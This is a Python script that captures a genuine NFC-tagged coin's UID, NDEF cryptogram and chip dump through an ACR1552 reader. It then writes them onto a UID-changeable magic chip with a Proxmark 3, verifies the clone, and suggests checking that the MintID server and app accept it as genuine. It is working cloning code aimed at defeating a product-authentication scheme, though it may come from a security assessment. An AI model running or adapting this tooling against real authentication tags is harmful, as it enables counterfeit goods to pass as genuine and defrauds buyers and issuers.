#!/usr/bin/env python3
"""
mintid_capture_and_clone.py — read a genuine coin via ACR1552, then
write the clone onto a magic chip on the Proxmark 3, all in one run.

Workflow (with both readers connected):

  1. Read the genuine coin on the ACR1552 (PC/SC). Capture UID, NDEF
     cryptogram, and full chip dump. Save to oracle DB.
  2. (Optional) POST to MintID server to confirm baseline authentication
     of the genuine coin.
  3. Wait for user confirmation that the genuine coin has been removed
     from the ACR and the magic chip is on the PM3 antenna.
  4. Write the captured (UID, NDEF) onto the magic chip via PM3.
     Skips page 2 (lock bytes) by default to keep the chip rewritable.
  5. Verify the clone by reading it back through PM3.
  6. (Optional) Move the cloned chip to the ACR and re-run the simulator
     to confirm the server returns the same response.

USAGE

    # Most common: capture from ACR, clone onto PM3 magic chip:
    python3 mintid_capture_and_clone.py

    # Skip the live server query (chip-side test only):
    python3 mintid_capture_and_clone.py --no-server

    # Use a UID that's already in the DB (skip ACR capture step):
    python3 mintid_capture_and_clone.py --use-uid 04C3434A9E7384

    # Lock the clone (FF FF locks, IRREVERSIBLE):
    python3 mintid_capture_and_clone.py --lock

    # Dry-run: show what would happen without writing:
    python3 mintid_capture_and_clone.py --dry-run

REQUIREMENTS
  * ACR1552 (or any PC/SC NFC reader) with the genuine coin on it
  * Proxmark 3 with magic Gen 2 / CUID Ultralight-C or magic NTAG 213
  * Both connected and recognised before starting
"""
import argparse
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from mintid_pm3_clone import (
    find_pm3_binary,
    poll_for_tag,
    run_pm3_command,
    parse_hf_14a_info,
    page_bytes_from_oracle,
    build_write_commands,
)


def banner(text):
    line = "=" * 60
    print("")
    print(line)
    print("  " + text)
    print(line)


def step1_capture_via_acr(args):
    """Run mintid_simulate.py as a subprocess to capture the chip on the
    ACR1552 and persist to the oracle DB. Returns the captured UID."""
    banner("STEP 1: Capture genuine coin via ACR1552")
    print("Place the GENUINE coin on the ACR1552 reader.")
    print("Capturing chip via mintid_simulate.py...")
    print("")

    if args.dry_run:
        print("[dry-run] Would invoke mintid_simulate.py.")
        return None

    import subprocess
    here = os.path.dirname(os.path.abspath(__file__))
    sim_args = [
        sys.executable,
        os.path.join(here, "mintid_simulate.py"),
        "--skip-active-commands",
        "--skip-deeper-probes",
    ]
    if args.no_server:
        sim_args.append("--dry-run")

    proc = subprocess.run(sim_args, capture_output=True, text=True)
    print(proc.stdout)
    if proc.returncode != 0:
        print("[fail] simulator exited %d" % proc.returncode)
        if proc.stderr:
            print(proc.stderr)
        return None

    # Pull the most-recent UID from the oracle DB (the simulator just wrote it)
    from mintid_oracle import Oracle
    oracle = Oracle(args.db)
    cur = oracle.connection.cursor()
    cur.execute(
        "SELECT chip_uid FROM scans WHERE chip_uid IS NOT NULL "
        "AND chip_uid != \'\' ORDER BY scan_id DESC LIMIT 1"
    )
    row = cur.fetchone()
    oracle.close()
    if row is None:
        print("[fail] No UID captured into oracle.")
        return None
    captured_uid = row[0]
    print("[ok] Captured UID: %s" % captured_uid)
    return captured_uid


def step2_wait_for_chip_swap(args):
    """Wait for the user to swap chips: take the genuine coin off the ACR,
    put the magic chip on the PM3."""
    banner("STEP 2: Swap chips")
    print("1. REMOVE the genuine coin from the ACR1552 reader.")
    print("2. PLACE the magic Ultralight-C on the Proxmark 3 antenna.")
    print("")
    print("Waiting for magic chip to appear on PM3 antenna...")

    if args.dry_run:
        print("[dry-run] Would poll PM3 until tag detected.")
        return {"uid_hex": "00000000000000", "magic_capabilities": "Gen 2 / CUID"}

    info = poll_for_tag(
        max_attempts=args.poll_attempts,
        delay_seconds=args.poll_delay,
        verbose=False,
    )
    if info is None:
        print("[fail] No tag detected on PM3 antenna within poll window.")
        return None

    print("[pm3] Detected tag on antenna:")
    print("       UID  : %s" % info["uid_hex"])
    print("       ATQA : %s" % (info.get("atqa_hex") or "?"))
    print("       SAK  : %s" % (info.get("sak_hex") or "?"))
    print("       Magic: %s" % (info.get("magic_capabilities") or "(none)"))

    if not info.get("magic_capabilities"):
        print("")
        print("[warn] PM3 didn't detect any magic capability on this chip.")
        print("       This usually means it's NOT a UID-changeable chip and")
        print("       the write will fail. Continue anyway? [y/N]")
        try:
            answer = input("> ").strip().lower()
        except EOFError:
            answer = "n"
        if answer != "y":
            print("Aborting.")
            return None

    return info


def step3_write_clone(args, target_uid, magic_info):
    """Write the captured dump onto the magic chip via PM3."""
    banner("STEP 3: Write clone")
    print("Source UID  : %s" % target_uid)
    print("Lock policy : %s" % (
        "FF FF locks WILL be written (clone permanent)"
        if args.lock else
        "Lock bytes SKIPPED (clone stays rewritable)"
    ))
    print("Variant     : %s" % args.variant)
    print("")

    pages = page_bytes_from_oracle(target_uid, args.db)
    if pages is None:
        print("[fail] No dump in DB for UID %s. Did step 1 succeed?" % target_uid)
        return False
    print("[ok] Loaded %d bytes (%d pages) from oracle." % (
        len(pages), len(pages) // 4,
    ))

    # Sanity check: magic UL-C only supports 7-byte UIDs
    uid_bytes = bytes.fromhex(target_uid)
    if len(uid_bytes) != 7:
        print("")
        print("[FAIL] Target UID is %d bytes long. Magic Ultralight-C only"
              % len(uid_bytes))
        print("       supports 7-byte UIDs.")
        print("")
        print("       UID %s appears to be from the 8-byte clone." % target_uid)
        print("       For the Coin 1 clone, use Proxmark 3 emulation")
        print("       (`hf mfu sim` with the captured dump) instead of")
        print("       writing to a magic chip.")
        print("")
        print("       For a writable demo, use one of the GENUINE NXP")
        print("       coins (UID starts with 04). Place a genuine coin")
        print("       on the ACR1552 and re-run.")
        return False

    # Build skip list
    skip_blocks = [0, 1]
    if not args.lock:
        skip_blocks.append(2)
        print("[note] Skipping pages 0/1 (UID/BCC via setuid), 2 (lock).")

    cmds = build_write_commands(target_uid, pages, args.variant,
                                 skip_blocks=skip_blocks)

    if args.dry_run:
        print("")
        print("[dry-run] Would run these PM3 commands:")
        for c in cmds:
            print("  " + c)
        return True

    print("")
    print("[pm3] Running write sequence...")
    cmd_string = "; ".join(cmds)
    stdout, stderr, rc = run_pm3_command(
        cmd_string, timeout=180, verbose=args.verbose,
    )
    print(stdout[-2500:])
    if rc != 0:
        print("[warn] PM3 exited %d. Output above may still indicate "
              "success; continue to verify." % rc)

    return True


def step4_verify(args, target_uid):
    """Verify the clone by reading the chip back via PM3."""
    banner("STEP 4: Verify clone")
    if args.dry_run:
        print("[dry-run] Would read chip back via `hf 14a info` and compare.")
        return True

    print("[pm3] Reading clone back...")
    time.sleep(1)
    info = poll_for_tag(max_attempts=20, delay_seconds=0.5, verbose=False)
    if info is None:
        print("[fail] No tag detected after write. Magic chip may have been "
              "removed during write.")
        return False

    if info["uid_hex"].upper() == target_uid.upper():
        print("[ok] UID matches target: %s" % target_uid)
    else:
        print("[fail] UID after write is %s, expected %s" % (
            info["uid_hex"], target_uid,
        ))
        return False

    # Compare full chip contents to original dump
    print("[pm3] Reading full chip dump for byte-level comparison...")
    bin_out = "/tmp/mintid_verify_%s.bin" % target_uid
    if os.path.exists(bin_out):
        os.remove(bin_out)
    stdout, _, _ = run_pm3_command(
        "hf mfu dump -f %s" % bin_out, timeout=60, verbose=args.verbose,
    )
    if not os.path.exists(bin_out):
        # PM3 may save to a different filename based on UID
        for fname in os.listdir("."):
            if fname.startswith("hf-mfu-") and fname.endswith("-dump.bin"):
                if target_uid.lower() in fname.lower():
                    bin_out = fname
                    break
    if not os.path.exists(bin_out):
        print("[warn] Could not locate PM3 dump file. Skipping byte compare.")
        return True

    actual = open(bin_out, "rb").read()
    expected = page_bytes_from_oracle(target_uid, args.db)

    # Compare only the pages we wrote (skip lock bytes if --lock not set)
    write_pages = list(range(1, len(expected) // 4))
    if not args.lock:
        write_pages = [p for p in write_pages if p != 2]

    mismatches = 0
    for page in write_pages:
        if page * 4 + 4 > min(len(actual), len(expected)):
            continue
        a = actual[page*4:(page+1)*4]
        e = expected[page*4:(page+1)*4]
        if a != e:
            mismatches += 1
            print("       page %2d: clone=%s, original=%s" % (
                page, a.hex().upper(), e.hex().upper(),
            ))

    if mismatches == 0:
        print("[ok] All written pages match the original dump byte-for-byte.")
    else:
        print("[warn] %d page(s) differ between clone and original." % mismatches)
        print("       (Lock bytes will differ if --lock was not used; that's expected.)")
    return mismatches == 0


def main():
    p = argparse.ArgumentParser(
        description="One-shot ACR-capture + PM3-clone of a MintID coin."
    )
    p.add_argument("--db", default="mintid_oracle.db",
                   help="Oracle database path (default: mintid_oracle.db).")
    p.add_argument("--variant", default="directwrite",
                   choices=["auto", "gen3", "gen1a", "directwrite", "ultralight"],
                   help="Magic chip variant (default: directwrite, "
                        "matches Gen 2 / CUID Ultralight-C).")
    p.add_argument("--use-uid", metavar="UID",
                   help="Skip ACR capture step, use this UID's existing "
                        "dump from the DB.")
    p.add_argument("--no-server", action="store_true",
                   help="Skip the baseline server POST during capture.")
    p.add_argument("--lock", action="store_true",
                   help="Write FF FF lock bytes faithfully (PERMANENT).")
    p.add_argument("--dry-run", action="store_true",
                   help="Show what would happen without writing.")
    p.add_argument("--verbose", "-v", action="store_true",
                   help="Print PM3 commands.")
    p.add_argument("--poll-attempts", type=int, default=120,
                   help="Max PM3 polls before timeout (default: 120 = 60s).")
    p.add_argument("--poll-delay", type=float, default=0.5,
                   help="Seconds between PM3 polls (default: 0.5).")
    args = p.parse_args()

    # Pre-flight: PM3 binary present
    if not args.dry_run:
        pm3 = find_pm3_binary()
        if pm3 is None:
            print("[fail] PM3 client binary not found. Install with:")
            print("       brew tap RfidResearchGroup/proxmark3")
            print("       brew install --HEAD proxmark3")
            return 1
        print("[ok] PM3 client at %s" % pm3)

    # Step 1: capture (or skip if --use-uid given)
    if args.use_uid:
        target_uid = args.use_uid.upper()
        print("[skip] Using existing dump for UID %s" % target_uid)
        existing = page_bytes_from_oracle(target_uid, args.db)
        if existing is None:
            print("[fail] No dump in DB for UID %s." % target_uid)
            return 1
    else:
        target_uid = step1_capture_via_acr(args)
        if target_uid is None:
            print("[fail] Capture step failed.")
            return 1

    # Step 2: wait for chip swap
    magic_info = step2_wait_for_chip_swap(args)
    if magic_info is None:
        return 1

    # Step 3: write
    if not step3_write_clone(args, target_uid, magic_info):
        return 1

    # Step 4: verify
    step4_verify(args, target_uid)

    banner("DONE")
    print("Clone of %s written to magic chip on PM3." % target_uid)
    print("")
    print("Next steps:")
    print("  1. Move cloned chip to ACR1552")
    print("  2. python3 mintid_simulate.py --skip-deeper-probes")
    print("     (should return identical server response to genuine coin)")
    print("  3. Tap cloned chip with iPhone MintID app")
    print("     (should show GenuineProductDetail with the same TagNumber)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
